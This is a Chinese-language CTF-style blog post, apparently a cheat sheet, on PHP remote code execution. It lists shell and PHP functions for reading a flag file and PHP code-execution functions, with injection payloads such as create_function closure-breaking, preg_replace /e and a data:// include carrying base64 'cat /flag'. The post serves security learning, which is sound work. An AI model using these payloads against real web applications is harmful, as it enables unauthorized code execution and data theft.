@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>RCE函数和命令 - 天下同春</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="RCE函数和命令 - 天下同春" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/02/26/RCE/index.html" />
+  
+  <meta property="og:image" content="/img/ye9.webp" />
+  
+  <meta property="og:article:published_time" content="2024-02-26T11:00:08.000Z" />
+  
+  <meta property="og:article:author" content="void2eye" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+    <script src='https://unpkg.com/@waline/client@v2/dist/waline.js'></script>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">天下同春</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">Home</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/void2eye" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/Web/">Web</a>
+        
+            <a href="/categories/Web/RCE/">RCE</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>26,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h1 class="title">RCE函数和命令</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="“读”-命令"><a href="#“读”-命令" class="headerlink" title="“读” 命令"></a>“读” 命令</h1><p>shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">less</span><br><span class="line">more</span><br><span class="line">head //head -n 10 filename</span><br><span class="line">tail //tail -n 10 filename</span><br><span class="line">nl</span><br><span class="line">od //od -c filename 以字符形式查看文件内容</span><br><span class="line">strings //strings filename</span><br><span class="line">xxd //xxd filename 显示文件的十六进制和 ASCII 字符</span><br><span class="line">awk //awk &#x27;&#123;print $1&#125;&#x27; filename 显示文件每行的第一列</span><br><span class="line">sed //sed -n &#x27;5,10p&#x27; filename 显示文件的第5到第10行</span><br><span class="line">grep //grep &#x27;pattern&#x27; filename</span><br><span class="line">dd  //dd if=filename bs=512 count=1 读取文件的前512字节</span><br><span class="line">vi/vim</span><br><span class="line">nano</span><br><span class="line">cut </span><br><span class="line">/*用于从每一行中提取指定的字段（列），通常用于提取 CSV、TSV 或其他分隔符分隔的数据。cut -d&#x27;,&#x27; -</span><br><span class="line">f1,2 file.txt: 使用逗号作为分隔符，提取第 1 和第 2 列。cut -c1-10 file.txt: 提取每一行的前 10 个字符。*/</span><br><span class="line">uniq //用于过滤或去除重复的行 直接uniq flag就可以</span><br><span class="line">sort </span><br><span class="line">// 用于对文本行进行排序。它可以按字母顺序、数字顺序、甚至是按特定列进行排序。 也可以直接sort flag</span><br><span class="line">tr  // tr &#x27;f&#x27; &#x27;F&#x27; &lt; flag用于替换或删除字符</span><br><span class="line">wc  //统计文本文件中的行数、单词数和字符数的命令,实在不行爆破吧：）</span><br><span class="line">la</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240815203342672.png" alt="image-20240815203342672"></p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">file</span>(); <span class="comment">//返回的是数组，可以直接cmd=echo file(&#x27;/flag&#x27;)[0];</span></span><br><span class="line"><span class="title function_ invoke__">fopen</span>()组合拳 <span class="comment">// cmd=echo fread(fopen(&#x27;/flag&#x27;,&#x27;r&#x27;),filesize(&#x27;/flag&#x27;));</span></span><br><span class="line"><span class="title function_ invoke__">fgets</span>() <span class="comment">//只能读一行 cmd=echo fgets(fopen(&#x27;/flag&#x27;,&#x27;r&#x27;),filesize(&#x27;/flag&#x27;));</span></span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()  <span class="comment">//只能读一字节（除非特别的情况，否则用处很少</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="keyword">include</span>/<span class="keyword">require</span> <span class="comment">// cmd=echo include &#x27;/flag&#x27;;NSSCTF&#123;c4d29639-7296-45ca-81cd-fbf3c3c9de93&#125; 1  `如果文件包含 PHP 代码，会被执行`</span></span><br><span class="line"><span class="title function_ invoke__">parse_ini_file</span>(); <span class="comment">//解析 ini 文件，并以数组的形式返回内容。</span></span><br><span class="line"><span class="title function_ invoke__">readlink</span>(); <span class="comment">//返回符号链接的目标。</span></span><br><span class="line"><span class="title function_ invoke__">glob</span>() <span class="comment">//查找与模式匹配的文件路径,返回的是数组。 print glob(&#x27;/fla*&#x27;)[0];    /flag</span></span><br><span class="line"><span class="title function_ invoke__">simplexml_load_file</span>() <span class="comment">//解析 XML 文件，并返回对象形式的内容。</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="“输出”命令"><a href="#“输出”命令" class="headerlink" title="“输出”命令"></a>“输出”命令</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>() <span class="comment">//打印数组和对象的函数 像上面的cmd=echo file(&#x27;/flag&#x27;)[0]可以直接cmd=print_r(file(&#x27;/flag&#x27;));</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>字符串动态执行，结尾必须有<code>；</code></p>
+<p><code>trick</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)<span class="meta">?&gt;</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span>;)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span><span class="meta">&lt;?</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p>assert是断言函数，可以用来命令执行,assert对分号<code>没有要求</code>。</p>
+<h2 id="preg-replace-PHP-5-5-0被弃用-7-0-0被废除"><a href="#preg-replace-PHP-5-5-0被弃用-7-0-0被废除" class="headerlink" title="preg_replace (PHP&gt;5.5.0被弃用,7.0.0被废除)"></a>preg_replace (PHP&gt;5.5.0被弃用,7.0.0被废除)</h2><p>这个函数本来是用来替换字符串的，但是他的e模式符导致了命令执行的可能<br><code>e模式符</code>也就是会用<code>eval执行代码</code>,示例如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/aaa/e&quot;</span>,<span class="string">&quot;phpinfo();&quot;</span>,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="call-user-func和call-user-func-array"><a href="#call-user-func和call-user-func-array" class="headerlink" title="call_user_func和call_user_func_array"></a>call_user_func和call_user_func_array</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;system&#x27;</span>,[<span class="string">&quot;whoami&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>会把第一个参数作为<code>回调函数</code>，第二个参数为函数的<code>形参</code>，一个传入字符串一个传入数组。最终都可以导致命令执行。</p>
+<h2 id="create-function（PHP-7-2-0-中移除）"><a href="#create-function（PHP-7-2-0-中移除）" class="headerlink" title="create_function（PHP 7.2.0 中移除）"></a>create_function（PHP 7.2.0 中移除）</h2><p>前言：已经被闭包代替：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sum_function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum_function</span>(<span class="number">3</span>, <span class="number">4</span>);  <span class="comment">// 输出 7</span></span><br></pre></td></tr></table></figure>
+
+<p>create_function可以用来创建一个匿名函数。</p>
+<p>create_function(‘$args’, ‘$code’)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$create_function</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$create_function</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>trick</code></p>
+<p>create_function也是往方法体注入内容，那么我们也是可以闭合方法体的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function (形参)&#123;</span><br><span class="line">  参数内容;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假如我们的参数内容是<code>&#125;xxxxx//</code>那么是不是也完成了闭合呢？然后xxxx部分就是我们控制的了，那么我们就不需要调用这个匿名函数，直接完成方法执行。</p>
+<p>另一种(反过来我们控制的不是函数体而是参数，道理一样)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$cmd</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">这个时候cmd就可以为：)&#123;&#125;<span class="keyword">echo</span> <span class="title function_ invoke__">file</span>(<span class="string">&#x27;/flag&#x27;</span>)[<span class="number">0</span>];<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h2><p>与call_user_func_array类似，也是回调函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&quot;system&quot;</span>,[<span class="string">&quot;whoami&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="include与伪协议的结合Getshell"><a href="#include与伪协议的结合Getshell" class="headerlink" title="include与伪协议的结合Getshell"></a>include与伪协议的结合Getshell</h2><p>伪协议：</p>
+<ul>
+<li><p>filter</p>
+</li>
+<li><p>data</p>
+<blockquote>
+<p>注意一定要开启<code>allow_url_include=On</code></p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;data://text/php,&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;data://text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==可以多重编码</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><h2 id="php中可以执行的"><a href="#php中可以执行的" class="headerlink" title="php中可以执行的"></a>php中可以执行的</h2><h3 id="回显型"><a href="#回显型" class="headerlink" title="回显型"></a>回显型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() </span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>pcntl_exec(“&#x2F;bin&#x2F;bash”,[“-c”,”whami”]),这里“-c”表示紧接着的字符串是一个<code>命令</code></p>
+</blockquote>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>() <span class="comment">//var_dump出来即可</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>() <span class="comment">//exec会返回第一行，shell_exec会返回所有结果</span></span><br><span class="line">`` <span class="comment">//==shell_exec</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240815190910472.png" alt="image-20240815190910472"></p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240815191313930.png" alt="image-20240815191313930"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>() </span><br><span class="line"><span class="title function_ invoke__">proc_open</span>() </span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>() </span><br></pre></td></tr></table></figure>
+
+<h4 id="popen-返回的流"><a href="#popen-返回的流" class="headerlink" title="popen 返回的流"></a><code>popen</code> 返回的流</h4><p>在 PHP 中，<code>popen</code> 函数用于打开一个管道（pipe）到一个进程，这个管道可以是只读的（<code>r</code>），只写的（<code>w</code>），或者是读写的。<code>popen</code> 函数会返回一个文件指针（通常称为 “流”），你可以通过这个指针来读取或写入数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cmd.exe /c dir&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$read</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>, <span class="number">2096</span>); <span class="comment">//全部读出来</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$read</span>;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$stream</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cmd.exe /c dir&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$stream</span>)) &#123; <span class="comment">//一次fgets只读一行</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;whoami&quot;</span>; <span class="comment">//dir只输出一行</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by void2eye, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Web/" class="tag">#Web</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/02/26/LD_PRELOAD/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">LD_PRELOAD</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/02/26/RMI/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">RMI</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        <div class="container">
+            <div id="waline"></div>
+            <script>
+                new Waline({
+                    el: "#waline",
+                    
+                    path: location.pathname,
+                    
+                    serverURL: https://blogcomment-blond.vercel.app/,
+                    
+                    requiredMeta: ['nick'],
+                    
+                });
+            </script>
+        </div>
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/void2eye/Registration-tool-automatic-submission-script" class="item">RE_tools</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a href="mailto:2110027730@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 void2eye<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        <br>
+        <span class="footer-extra-description"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2024135394号</a></span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
